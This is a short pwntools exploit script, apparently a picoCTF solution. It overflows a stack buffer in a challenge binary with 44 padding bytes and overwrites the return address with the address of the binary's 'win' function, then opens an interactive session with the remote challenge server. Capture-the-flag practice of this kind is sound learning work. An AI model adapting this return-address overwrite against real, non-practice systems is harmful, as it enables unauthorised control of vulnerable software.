from pwn import *

conn = remote("saturn.picoctf.net", 49457)
elf = ELF("vuln")
payload = b""
payload += b"a" * 44
payload += p32(elf.symbols["win"])
conn.sendline(payload)
conn.interactive()
